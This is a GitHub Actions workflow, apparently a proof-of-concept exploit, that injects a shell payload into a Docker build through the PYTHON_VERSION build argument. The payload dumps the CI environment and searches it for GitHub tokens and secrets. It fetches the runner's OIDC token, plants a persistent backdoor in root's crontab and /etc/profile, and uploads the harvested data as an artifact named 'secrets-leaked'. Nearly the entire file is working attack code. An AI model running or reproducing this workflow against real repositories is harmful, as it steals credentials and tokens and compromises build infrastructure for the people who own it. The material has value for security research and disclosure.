name: Critical RCE & Secrets Leak

on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Prepare Dockerfile
        run: |
          mkdir -p ./taskcluster/docker/python
          cp Dockerfile ./taskcluster/docker/python/

      - name: Build & Run Exploit
        run: |
          PAYLOAD=$(cat <<'EOF'
          echo "[*] Dumping CI ENV and Secrets..." > /leaked.txt
          printenv >> /leaked.txt

          echo "[*] Searching for GitHub Token..."
          grep -i 'ghp_' /leaked.txt >> /leaked.txt
          grep -i 'github' /leaked.txt >> /leaked.txt
          grep -i 'token' /leaked.txt >> /leaked.txt
          grep -i 'secret' /leaked.txt >> /leaked.txt

          echo "[*] Trying to access GitHub OIDC Token..."
          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
               "$ACTIONS_ID_TOKEN_REQUEST_URL" >> /leaked.txt

          echo "[*] Installing persistent runtime backdoor..."
          echo '#!/bin/sh' > /usr/local/bin/init.sh
          echo 'echo "[*] Backdoor triggered" >> /runtime.log' >> /usr/local/bin/init.sh
          echo 'printenv >> /runtime.log' >> /usr/local/bin/init.sh
          chmod +x /usr/local/bin/init.sh
          echo '@reboot /usr/local/bin/init.sh' >> /etc/crontabs/root
          echo '/usr/local/bin/init.sh' >> /etc/profile
          EOF
          )

          docker build \
            --build-arg PYTHON_VERSION="$PAYLOAD" \
            -t ci-compromise ./taskcluster/docker/python

          docker run --rm ci-compromise cat /leaked.txt > output.txt

      - name: Upload Leaked Secrets
        uses: actions/upload-artifact@v4
        with:
          name: secrets-leaked
          path: output.txt
